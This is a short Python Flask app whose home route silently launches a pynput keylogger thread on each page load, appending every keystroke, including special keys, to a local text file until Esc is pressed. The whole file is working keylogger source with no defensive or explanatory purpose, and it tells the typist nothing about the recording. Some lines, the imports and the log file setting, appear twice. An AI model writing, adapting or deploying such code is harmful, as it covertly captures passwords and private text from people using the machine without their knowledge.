from flask import Flask, render_template
import logging
import threading
from pynput import keyboard

# Set up Flask app
app = Flask(__name__)

# File to save the keystrokes
log_file = "key_log.txt"

from pynput import keyboard

log_file = "key_log.txt"  # Update this with the path to your log file

def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Check for the space key explicitly
            if key == keyboard.Key.space:
                file.write(" ")  # Add a space when the spacebar is pressed
            elif hasattr(key, 'char') and key.char is not None:
                file.write(key.char)  # Write regular keys
            else:
                file.write(f"[{key}]")  # Special keys (e.g., Enter, Shift)
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    # Stop the keylogger when Esc is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    # Start listening to the keyboard
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


@app.route('/')
def home():
    # Start the keylogger in a new thread when the page loads
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Serve the HTML page
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
